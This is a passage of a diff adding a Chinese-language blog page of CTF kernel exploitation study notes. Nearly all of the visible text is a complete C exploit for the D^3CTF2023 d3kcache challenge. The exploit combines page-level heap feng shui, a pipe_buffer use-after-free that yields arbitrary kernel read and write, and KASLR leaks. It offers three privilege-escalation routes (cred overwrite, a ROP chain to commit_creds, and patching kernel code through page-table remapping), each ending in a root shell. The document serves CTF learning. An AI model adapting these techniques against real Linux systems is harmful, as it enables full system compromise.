+    err_setsockopt:
+    close(socket_fd);
+    err_out:
+    return ret;
+}
+
+/* the parent process should call it to send command of allocation to child */
+int alloc_page(int idx, unsigned int size, unsigned int nr) {
+    struct pgv_page_request req = {
+            .idx = idx,
+            .cmd = CMD_ALLOC_PAGE,
+            .size = size,
+            .nr = nr,
+    };
+    int ret;
+
+    write(cmd_pipe_req[1], &amp;req, sizeof(struct pgv_page_request));
+    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));
+
+    return ret;
+}
+
+/* the parent process should call it to send command of freeing to child */
+int free_page(int idx) {
+    struct pgv_page_request req = {
+            .idx = idx,
+            .cmd = CMD_FREE_PAGE,
+    };
+    int ret;
+
+    write(cmd_pipe_req[1], &amp;req, sizeof(req));
+    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));
+    usleep(10000);
+    return ret;
+}
+
+/* the child, handler for commands from the pipe */
+void spray_cmd_handler(void) {
+    struct pgv_page_request req;
+    int socket_fd[PGV_PAGE_NUM];
+    int ret;
+
+    /* create an isolate namespace*/
+    unshare_setup();
+
+    /* handler request */
+    do {
+        read(cmd_pipe_req[0], &amp;req, sizeof(req));
+
+        if (req.cmd == CMD_ALLOC_PAGE) {
+            ret = create_socket_and_alloc_pages(req.size, req.nr);
+            socket_fd[req.idx] = ret;
+        } else if (req.cmd == CMD_FREE_PAGE) {
+            ret = close(socket_fd[req.idx]);
+        } else {
+            printf(&quot;[x] invalid request: %d\n&quot;, req.cmd);
+        }
+
+        write(cmd_pipe_reply[1], &amp;ret, sizeof(ret));
+    } while (req.cmd != CMD_EXIT);
+}
+
+/* init pgv-exploit subsystem :) */
+void prepare_pgv_system(void) {
+    /* pipe for pgv */
+    pipe(cmd_pipe_req);
+    pipe(cmd_pipe_reply);
+
+    /* child process for pages spray */
+    if (!fork()) {
+        spray_cmd_handler();
+    }
+}
+
+/**
+ * IV - config for page-level heap spray and heap fengshui
+ */
+#define PIPE_SPRAY_NUM 200
+
+#define PGV_1PAGE_SPRAY_NUM 0x20
+
+#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
+#define PGV_4PAGES_SPRAY_NUM 0x40
+
+#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
+#define PGV_8PAGES_SPRAY_NUM 0x40
+
+int pgv_1page_start_idx = 0;
+int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
+int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;
+
+/* spray pages in different size for various usages */
+void prepare_pgv_pages(void) {
+    /**
+     * We want a more clear and continuous memory there, which require us to
+     * make the noise less in allocating order-3 pages.
+     * So we pre-allocate the pages for those noisy objects there.
+     */
+    puts(&quot;[*] spray pgv order-0 pages...&quot;);
+    for (int i = 0; i &lt; PGV_1PAGE_SPRAY_NUM; i++) {
+        if (alloc_page(i, 0x1000, 1) &lt; 0) {
+            printf(&quot;[x] failed to create %d socket for pages spraying!\n&quot;, i);
+        }
+    }
+
+    puts(&quot;[*] spray pgv order-2 pages...&quot;);
+    for (int i = 0; i &lt; PGV_4PAGES_SPRAY_NUM; i++) {
+        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) &lt; 0) {
+            printf(&quot;[x] failed to create %d socket for pages spraying!\n&quot;, i);
+        }
+    }
+
+    /* spray 8 pages for page-level heap fengshui */
+    puts(&quot;[*] spray pgv order-3 pages...&quot;);
+    for (int i = 0; i &lt; PGV_8PAGES_SPRAY_NUM; i++) {
+        /* a socket need 1 obj: sock_inode_cache  832   19    4 , 19 objs for 1 slub on 4 page*/
+        if (i % 19 == 0) {
+            free_page(pgv_4pages_start_idx++);
+        }
+
+        /* a socket need 1 dentry: dentry  192   21    1, 21 objs for 1 slub on 1 page */
+        if (i % 21 == 0) {
+            free_page(pgv_1page_start_idx += 2);
+        }
+
+        /* a pgv need 1 obj: kmalloc-8  8  512    1, 512 objs for 1 slub on 1 page*/
+        if (i % 512 == 0) {
+            free_page(pgv_1page_start_idx += 2);
+        }
+
+        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) &lt; 0) {
+            printf(&quot;[x] failed to create %d socket for pages spraying!\n&quot;, i);
+        }
+    }
+
+    puts(&quot;&quot;);
+}
+
+
+int kcache_fd;
+
+typedef struct {
+    int index;
+    uint32_t size;
+    void *buf;
+} kcache_cmd;
+
+
+int kcache_alloc(int index, uint32_t size, void *buf) {
+    return ioctl(kcache_fd, 0x114, &amp;(kcache_cmd) {index, size, buf});
+}
+
+int kcache_write(int index, uint32_t size, void *buf) {
+    return ioctl(kcache_fd, 0x514, &amp;(kcache_cmd) {index, size, buf});
+}
+
+int kcache_read(int index, uint32_t size, void *buf) {
+    return ioctl(kcache_fd, 0x1919, &amp;(kcache_cmd) {index, size, buf});
+}
+
+int kcache_free(int index) {
+    return ioctl(kcache_fd, 0x810, &amp;(kcache_cmd) {.index=index});
+}
+
+#define KCACHE_NUM 0x10
+#define KCACHE_SIZE 2048
+
+#define SND_PIPE_BUF_SZ 96
+#define TRD_PIPE_BUF_SZ 192
+
+int pipe_fd[PIPE_SPRAY_NUM][2];
+
+struct pipe_buffer {
+    struct page *page;
+    unsigned int offset, len;
+    const struct pipe_buf_operations *ops;
+    unsigned int flags;
+    unsigned long private;
+} info_pipe_buf, evil_pipe_buf[3];
+int orig_pipe_id[2] = {-1, -1};
+int victim_pip_id[2] = {-1, -1};
+int evil_pipe_id[3] = {-1, -1, -1};
+size_t page_offset_base = 0xffff888000000000;
+size_t vmemmap_base = 0xffffea0000000000;
+size_t kernel_offset;
+size_t current_task;
+size_t buf[0x1000];
+
+struct page *direct_map_addr_to_page_addr(size_t direct_map_addr) {
+    return (struct page *) (vmemmap_base + ((direct_map_addr &amp; (~0xFFF)) - page_offset_base) / 0x1000 * 0x40);
+}
+
+ssize_t arbitrary_read_by_pipe(void *page_to_read, void *dst) {
+    evil_pipe_buf[0].offset = 0;
+    evil_pipe_buf[0].len = 0x1FF8;
+    evil_pipe_buf[0].page = page_to_read;
+
+    write(pipe_fd[evil_pipe_id[1]][1], &amp;evil_pipe_buf[2], sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], &amp;evil_pipe_buf[0], sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], &amp;evil_pipe_buf[1], sizeof(info_pipe_buf));
+    return read(pipe_fd[evil_pipe_id[0]][0], dst, 0xFFF);
+}
+
+ssize_t arbitrary_write_by_pipe(void *page_to_write, void *src, size_t len) {
+    evil_pipe_buf[0].offset = 0;
+    evil_pipe_buf[0].len = 0;
+    evil_pipe_buf[0].page = page_to_write;
+
+    write(pipe_fd[evil_pipe_id[1]][1], &amp;evil_pipe_buf[2], sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], &amp;evil_pipe_buf[0], sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
+    write(pipe_fd[evil_pipe_id[2]][1], &amp;evil_pipe_buf[1], sizeof(info_pipe_buf));
+    return write(pipe_fd[evil_pipe_id[0]][1], src, len);
+}
+
+
+
+void first_fengshui(){
+
+
+    puts(&quot;[*] spray pipe_buffer...&quot;);
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        if (pipe(pipe_fd[i]) &lt; 0) {
+            perror(&quot;[-] failed to create pipe.&quot;);
+            exit(-1);
+        }
+    }
+
+    puts(&quot;[*] exetend pipe_buffer...&quot;);
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        if (i % 8 == 0) {
+            free_page(pgv_8pages_start_idx++);
+        }
+        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) &lt; 0) {
+            perror(&quot;[-] failed to extend pipe.&quot;);
+            exit(-1);
+        }
+        if (i == PIPE_SPRAY_NUM / 2) {
+            puts(&quot;[*] spray vulnerable 2k obj...&quot;);
+            free_page(pgv_8pages_start_idx++);
+            for (int j = 0; j &lt; KCACHE_NUM; j++) {
+                kcache_alloc(j, 3, &quot;llk&quot;);
+            }
+            puts(&quot;[*] exetend pipe_buffer...&quot;);
+        }
+    }
+
+    puts(&quot;[*] allocating pipe pages...&quot;);
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        write(pipe_fd[i][1], &quot;llk&quot;, 3);
+        for (int j = 0; j &lt; 8; j++) {
+            write(pipe_fd[i][1], &amp;i, sizeof(int));
+        }
+    }
+}
+
+void first_fengshui_UAF(){
+
+
+    puts(&quot;[*] trigerring cross-cache off-by-null...&quot;);
+    memset(buf, 0, sizeof(buf)); 
+    for (int i = 0; i &lt; KCACHE_NUM; i++) {
+        kcache_write(i, KCACHE_SIZE - 3, buf);
+    }
+
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        int nr;
+        read(pipe_fd[i][0], buf, 3);
+        read(pipe_fd[i][0], &amp;nr, sizeof(int));
+        if (!memcmp(buf, &quot;llk&quot;, 3) &amp;&amp; nr != i) {
+            orig_pipe_id[0] = nr, victim_pip_id[0] = i;
+            printf(&quot;[+] find victim: %d, orig: %d.\n&quot;, victim_pip_id[0], orig_pipe_id[0]);
+        }
+    }
+
+    if (orig_pipe_id[0] == -1) {
+        puts(&quot;[-] failed to corrupt pipe_buffer.&quot;);
+        exit(-1);
+    }
+
+    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ / sizeof(struct pipe_buffer));
+    write(pipe_fd[victim_pip_id[0]][1], buf, SND_PIPE_BUF_SZ * 2 - 3 - 8 * sizeof(int));
+
+    puts(&quot;[*] free original pipe...&quot;);
+    close(pipe_fd[orig_pipe_id[0]][0]);
+    close(pipe_fd[orig_pipe_id[0]][1]);
+
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        if (i == orig_pipe_id[0] || i == victim_pip_id[0]) {
+            continue;
+        }
+        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) &lt; 0) {
+            perror(&quot;[-] failed to extend pipe.&quot;);
+            exit(-1);
+        }
+    }
+
+    read(pipe_fd[victim_pip_id[0]][0], buf, SND_PIPE_BUF_SZ - 3 - sizeof(int));
+    read(pipe_fd[victim_pip_id[0]][0], &amp;info_pipe_buf, sizeof(info_pipe_buf));
+
+    qword_dump(&quot;leak pipe_buffer&quot;, &amp;info_pipe_buf, sizeof(info_pipe_buf));
+    kernel_offset = (size_t) info_pipe_buf.ops - 0xffffffff82451b30;
+    printf(&quot;[+] kernel offset: %p\n&quot;, kernel_offset);
+}
+
+void second_fengshui(){
+
+    puts(&quot;[*] construct a second-level uaf pipe page...&quot;);
+    write(pipe_fd[victim_pip_id[0]][1], &amp;info_pipe_buf, sizeof(info_pipe_buf));
+
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        int nr;
+        if (i == orig_pipe_id[0] || i == victim_pip_id[0]) {
+            continue;
+        }
+        read(pipe_fd[i][0], &amp;nr, sizeof(nr));
+        if (nr &gt;= 0 &amp;&amp; nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) {
+            orig_pipe_id[1] = nr;
+            victim_pip_id[1] = i;
+            printf(&quot;[+] find second-level victim: %d, orig: %d.\n&quot;, victim_pip_id[1], orig_pipe_id[1]);
+        }
+    }
+    if (victim_pip_id[1] == -1) {
+        puts(&quot;[-] failed to corrupt second-level pipe_buffer.&quot;);
+        exit(-1);
+    }
+}
+
+void second_fengshui_UAF(){
+    size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ / sizeof(struct pipe_buffer));
+    write(pipe_fd[victim_pip_id[1]][1], buf, sizeof(info_pipe_buf) - 3 - 8 * sizeof(int));
+
+    puts(&quot;[*] free second-level original pipe...&quot;);
+    close(pipe_fd[orig_pipe_id[1]][0]);
+    close(pipe_fd[orig_pipe_id[1]][1]);
+
+    puts(&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;);
+    for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++) {
+        if (i == orig_pipe_id[0] || i == orig_pipe_id[1] || i == victim_pip_id[0] || i == victim_pip_id[1]) {
+            continue;
+        }
+        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) &lt; 0) {
+            perror(&quot;[-] failed to extend pipe.&quot;);
+            exit(-1);
+        }
+    }
+}
+
+void build_self_write_pipe(){
+    for (int i = 0; i &lt; 3; i++) {
+        puts(&quot;[*] hijacking pipe_buffer on page to itself...&quot;);
+        memcpy(&amp;evil_pipe_buf[i], &amp;info_pipe_buf, sizeof(info_pipe_buf));
+        evil_pipe_buf[i].offset = TRD_PIPE_BUF_SZ;
+        evil_pipe_buf[i].len = TRD_PIPE_BUF_SZ;
+        write(pipe_fd[victim_pip_id[1]][1], buf, TRD_PIPE_BUF_SZ - sizeof(info_pipe_buf));
+        write(pipe_fd[victim_pip_id[1]][1], &amp;evil_pipe_buf[i], sizeof(info_pipe_buf));
+
+        for (int j = 0; j &lt; PIPE_SPRAY_NUM; j++) {
+            if (j == orig_pipe_id[0] || j == orig_pipe_id[1] || j == victim_pip_id[0] || j == victim_pip_id[1]) {
+                continue;
+            }
+            bool flag = false;
+            for (int k = 0; k &lt; i; k++) {
+                if (j == evil_pipe_id[k]) {
+                    flag = true;
+                    break;
+                }
+            }
+            if (flag) {
+                continue;
+            }
+            struct page *page_ptr;
+            read(pipe_fd[j][0], &amp;page_ptr, sizeof(page_ptr));
+            if (page_ptr == info_pipe_buf.page) {
+                evil_pipe_id[i] = j;
+                printf(&quot;[+] find self-writing pipe: %d\n&quot;, evil_pipe_id[i]);
+            }
+        }
+        if (evil_pipe_id[i] == -1) {
+            puts(&quot;[-] failed to build self-writing pipe.&quot;);
+            exit(-1);
+        }
+    }
+}
+void leak(){
+    evil_pipe_buf[1].offset = TRD_PIPE_BUF_SZ * 3;
+    evil_pipe_buf[1].len = 0;
+    write(pipe_fd[evil_pipe_id[2]][1], &amp;evil_pipe_buf[1], sizeof(info_pipe_buf));
+
+    evil_pipe_buf[2].offset = TRD_PIPE_BUF_SZ;
+    evil_pipe_buf[2].len = 0;
+
+    vmemmap_base = (size_t) info_pipe_buf.page &amp; 0xfffffffff0000000;
+    while (true) {
+        arbitrary_read_by_pipe((void *) vmemmap_base + 0x9d000 / 0x1000 * 0x40, buf);
+        if (kernel_offset + 0xFFFFFFFF81000070 == buf[0]) {
+            printf(&quot;[+] find secondary_startup_64: %p\n&quot;, buf[0]);
+            break;
+        }
+        vmemmap_base -= 0x10000000;
+    }
+    printf(&quot;[+] vmemmap_base: %p\n&quot;, vmemmap_base);
+
+    puts(&quot;[*] seeking task_struct in memory...&quot;);
+    prctl(PR_SET_NAME, &quot;pwn-llk&quot;);
+    for (int i = 0;; i++) {
+        ssize_t len = arbitrary_read_by_pipe((void *) vmemmap_base + i * 0x40, buf);
+        size_t *comm = memmem(buf, len, &quot;pwn-llk&quot;, 13);
+        if (comm &amp;&amp; is_dir_mapping_addr(comm[-2])
+            &amp;&amp; is_dir_mapping_addr(comm[-57])
+            &amp;&amp; is_dir_mapping_addr(comm[-56])) {
+            current_task = comm[-50] - 2528;
+            page_offset_base = (comm[-50] &amp; 0xfffffffffffff000) - i * 0x1000;
+            page_offset_base &amp;= 0xfffffffff0000000;
+            printf(&quot;[+] find currtent task_struct: %p\n&quot;, current_task);
+            printf(&quot;[+] page_offset_base: %p\n&quot;, page_offset_base);
+            break;
+        }
+    }
+}
+
+void privilege_escalation_by_task_overwrite() {
+    /* finding the init_task, the final parent of every task */
+    puts(&quot;[*] Seeking for init_task...&quot;);
+    size_t init_cred;
+    size_t task = current_task;
+    while (true) {
+        arbitrary_read_by_pipe(direct_map_addr_to_page_addr(task), buf);
+        arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(task) + 0x40, &amp;buf[0x1000 / 8]);
+        if ((buf[((task &amp; 0xFFF) + 0x998) / 8] &amp; 0xFFFFFFFF) == 0) {
+            init_cred = buf[((task &amp; 0xFFF) + 0xB60) / 8];
+            printf(&quot;[+] find init_cred: %p\n&quot;, init_cred);
+            break;
+        }
+        task = buf[((task &amp; 0xFFF) + 0x8D0) / 8] - 0x8D0;
+    }
+
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);
+    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &amp;buf[0x1000 / 8]);
+    buf[((current_task &amp; 0xFFF) + 0xB58) / 8] = init_cred;
+    buf[((current_task &amp; 0xFFF) + 0xB60) / 8] = init_cred;
+    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(current_task), buf, 0xff0);
+    arbitrary_write_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &amp;buf[0x1000 / 8], 0xff0);
+    system(&quot;/bin/sh&quot;);
+}
+
+size_t stack_addr, pgd_addr;
+
+void pgd_vaddr_init() {
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(current_task), buf);
+    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(current_task) + 0x40, &amp;buf[0x1000 / 8]);
+    stack_addr = buf[((current_task &amp; 0xFFF) + 0x20) / 8];
+    printf(&quot;[*] kernel stack addr: %p\n&quot;, stack_addr);
+    size_t mm_struct_addr = buf[((current_task &amp; 0xFFF) + 0x920) / 8];
+    printf(&quot;[*] mm_struct addr: %p\n&quot;, mm_struct_addr);
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(mm_struct_addr), buf);
+    arbitrary_read_by_pipe((void *) direct_map_addr_to_page_addr(mm_struct_addr) + 0x40, &amp;buf[0x1000 / 8]);
+    pgd_addr = buf[((mm_struct_addr &amp; 0xFFF) + 0x48) / 8];
+    printf(&quot;[*] pgd addr: %p\n&quot;, pgd_addr);
+}
+
+#define PTE_OFFSET 12
+#define PMD_OFFSET 21
+#define PUD_OFFSET 30
+#define PGD_OFFSET 39
+
+#define PT_ENTRY_MASK 0b111111111UL
+#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)
+#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)
+#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)
+#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)
+
+#define PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)
+#define PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)
+#define PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)
+#define PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)
+
+#define PAGE_RW (1ULL &lt;&lt; 1)
+#define PAGE_NX (1ULL &lt;&lt; 63)
+
+size_t vaddr_to_paddr_for_4_level(size_t vaddr) {
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
+    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
+    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
+    size_t pte_vaddr = ((buf[PMD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);
+    return ((buf[PTE_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) | (vaddr &amp; 0xFFF);
+}
+
+size_t vaddr_to_paddr_for_3_level(size_t vaddr) {
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
+    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
+    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
+    return ((buf[PMD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) | (vaddr &amp; 0x1FFFFF);
+}
+
+void vaddr_remapping(size_t vaddr, size_t paddr) {
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pgd_addr), buf);
+    size_t pud_vaddr = ((buf[PGD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);
+    size_t pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);
+    size_t pte_vaddr = ((buf[PMD_ENTRY(vaddr)] &amp; (~0xFFF)) &amp; (~PAGE_NX)) + page_offset_base;
+    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);
+    buf[PTE_ENTRY(vaddr)] = (paddr &amp; (~0xFFF)) | 0x8000000000000867;/* mark it writable */
+    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf, 0xff0);
+}
+
+void get_shell(void) {
+    char *args[] = {&quot;/bin/sh&quot;, &quot;-i&quot;, NULL};
+    execve(args[0], args, NULL);
+}
+
+void privilege_escalation_by_rop() {
+    pgd_vaddr_init();
+    stack_addr = vaddr_to_paddr_for_4_level(stack_addr) + page_offset_base;
+    printf(&quot;[*] stack addr on direct mapping space: %p\n&quot;, stack_addr);
+    save_status();
+    size_t ret = 0xffffffff8107af08 + kernel_offset;
+    size_t pop_rdi_ret = 0xffffffff818710dd + kernel_offset;
+    size_t init_cred = 0xFFFFFFFF83079EE8 + kernel_offset;
+    size_t commit_creds = 0xFFFFFFFF811284E0 + kernel_offset;
+    size_t swapgs_restore_regs_and_return_to_usermode = 0xFFFFFFFF82201A90 + kernel_offset;
+    size_t *rop = buf;
+    for (int i = 0; i &lt; ((0x1000 - 0x100) / 8); i++) { *rop++ = ret; }
+    *rop++ = pop_rdi_ret;
+    *rop++ = init_cred;
+    *rop++ = commit_creds;
+    *rop++ = swapgs_restore_regs_and_return_to_usermode + 0x36;
+    rop++;
+    rop++;
+    *rop++ = (size_t) get_shell;
+    *rop++ = user_cs;
+    *rop++ = user_rflags;
+    *rop++ = user_sp;
+    *rop++ = user_ss;
+    puts(&quot;[*] hijacking current task&#39;s stack...&quot;);
+    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(stack_addr + 0x1000 * 3), buf, 0xff0);
+}
+
+void privilege_escalation_by_usma() {
+    pgd_vaddr_init();
+    size_t ns_capable_setid_vaddr = 0xFFFFFFFF810FD2A0 + kernel_offset;
+    printf(&quot;[*] ns_capable_setid vaddr: %p\n&quot;, ns_capable_setid_vaddr);
+    size_t ns_capable_setid_paddr = vaddr_to_paddr_for_3_level(ns_capable_setid_vaddr);
+    printf(&quot;[*] ns_capable_setid vaddr in dir map: %p\n&quot;, ns_capable_setid_paddr + page_offset_base);
+    size_t ns_capable_setid_page_paddr = ns_capable_setid_paddr &amp; ~0xFFF;
+    char *code_mmap = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memset(code_mmap, 0, 0x2000);
+    vaddr_remapping((size_t) code_mmap, ns_capable_setid_page_paddr);
+    vaddr_remapping((size_t) code_mmap + 0x1000, ns_capable_setid_page_paddr + 0x1000);
+    sleep(1);
+    byte_dump(&quot;code_mmap&quot;, code_mmap + (ns_capable_setid_paddr &amp; 0xFFF), 0x100);
+    uint8_t shellcode[] = {0x48, 0xc7, 0xc0, 0x1, 0x0, 0x0, 0x0, 0xc3};
+    memcpy(code_mmap + (ns_capable_setid_paddr &amp; 0xFFF), shellcode, sizeof(shellcode));
+    setresuid(0, 0, 0);
+    system(&quot;/bin/sh&quot;);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    bind_core(true,false);
+    puts(&quot;step 1: open /dev/d3kcache &quot;);
+    int kcache_fd = open(&quot;/dev/d3kcache&quot;, O_RDWR);
+    puts(&quot;step 2: prepare for namespace process and pipe for alloc order page &quot;);
+    prepare_pgv_system();
+    puts(&quot;step 3: setsocket heap spray for contiguous order 3 page   &quot;);
+    prepare_pgv_pages();
+    puts(&quot;step 4: build first page fengshui  &quot;);
+    first_fengshui();
+    puts(&quot;step 5: build pipbuffer page UAF  &quot;);
+    first_fengshui_UAF();
+    puts(&quot;step 6: build second page fengshui &quot;);
+    second_fengshui();
+    puts(&quot;step 7: fill UAF page by pipebuffer and build pipebuffer page UAF  &quot;);
+    second_fengshui_UAF();
+    puts(&quot;step 8: fill UAF page by pipebuffer and build three pipe which their page point to the page they are in&quot;);
+    build_self_write_pipe();
+    puts(&quot;step 8: build arbitary read write and leak  page_offset_base and vmemmap_base and  Kernel offset &quot;);
+    leak();
+
+    if (argv[1] &amp;&amp; !strcmp(argv[1], &quot;rop&quot;)) {
+        privilege_escalation_by_rop();
+    } else if (argv[1] &amp;&amp; !strcmp(argv[1], &quot;usma&quot;)) {
+        privilege_escalation_by_usma();
+    } else {
+        privilege_escalation_by_task_overwrite();
+    }
+
+}
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><span></span><a href="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN-kernel%20-%20%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"><span class="l">下一篇</span>CTF-PWN-kernel - 前置知识</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#cpu-绑定">CPU 绑定</a><a class="d2" href="#cred_jar-可以合并">cred_jar 可以合并</a><a class="d3" href="#exp">exp</a><a class="d2" href="#cred_jar-不可合并">cred_jar 不可合并</a><a class="d3" href="#利用-tty_struct-劫持程序控制流提权">利用 tty_struct 劫持程序控制流提权</a><a class="d3" href="#exp-1">exp</a><a class="d2" href="#通过堆布局溢出修改-cred">通过堆布局溢出修改 cred</a><a class="d3" href="#exp-2">exp</a><a class="d2" href="#堆溢出-堆喷覆盖-seq_operations-以控制内核执行流">堆溢出 + 堆喷，覆盖 seq_operations 以控制内核执行流</a><a class="d3" href="#exp-3">exp</a><a class="d2" href="#通过-modprobe_path-提权">通过 modprobe_path 提权</a><a class="d2" href="#利用">利用</a><a class="d3" href="#exp-4">exp</a><a class="d2" href="#调试">调试</a><a class="d2" href="#漏洞">漏洞</a><a class="d2" href="#利用-1">利用</a><a class="d3" href="#poll">poll</a><a class="d3" href="#初始化">初始化</a><a class="d3" href="#堆喷-poll_list-和-user_key_payload">堆喷 poll_list 和 user_key_payload</a><a class="d3" href="#堆喷-seq_operations-结构体与-keyctl_read">堆喷 seq_operations 结构体与 keyctl_read</a><a class="d3" href="#堆喷-ptmx">堆喷 ptmx</a><a class="d3" href="#释放-seq再堆喷-poll_list-和-user_key释放后通过-setxattr-堆喷-user_key-修改-">释放 seq，再堆喷 poll_list 和 user_key；释放后，通过 setxattr + 堆喷 user_key 修改 UAF chunk</a><a class="d3" href="#释放-tty_struct堆喷-pipe_buffer-和-poll_list释放后再堆喷-user_key_paylo">释放 tty_struct，堆喷 pipe_buffer 和 poll_list，释放后再堆喷 user_key_payload 劫持 pipe_buffer</a><a class="d3" href="#rop">rop</a><a class="d2" href="#simple_xattr任何有链表-unlink-操作的结构体都可以">simple_xattr（任何有链表 unlink 操作的结构体都可以）</a><a class="d2" href="#使用-setsocket-分配页面">使用 setsocket 分配页面</a><a class="d2" href="#使用-setsocket-进行命名空间逃逸">使用 setsocket 进行命名空间逃逸</a><a class="d2" href="#处理-fork-噪声与-clone-子进程标志">处理 fork 噪声与 clone 子进程标志</a><a class="d2" href="#进程间管道通信">进程间管道通信</a><a class="d2" href="#利用-2">利用</a><a class="d3" href="#注意事项">注意事项</a><a class="d3" href="#exp-5">exp</a><a class="d2" href="#d3ctf2023-d3kcache">D^3CTF2023 d3kcache</a><a class="d2" href="#以-root-身份调试">以 root 身份调试</a><a class="d2" href="#ext4-文件系统相关打包">ext4 文件系统相关打包</a><a class="d3" href="#struct-page-指针线性映射区与-vmemmap">struct page 指针、线性映射区与 vmemmap</a><a class="d3" href="#pipebuffer">pipebuffer</a><a class="d3" href="#利用-3">利用</a><a class="d3" href="#第一级页-uaf">第一级页 UAF</a><a class="d3" href="#第二级页-uaf">第二级页 UAF</a><a class="d3" href="#任意读写">任意读写</a><a class="d3" href="#泄露-task_struct-和-kernel_base">泄露 task_struct 和 kernel_base</a><a class="d3" href="#提权">提权</a><a class="d3" href="#exp-6">exp</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
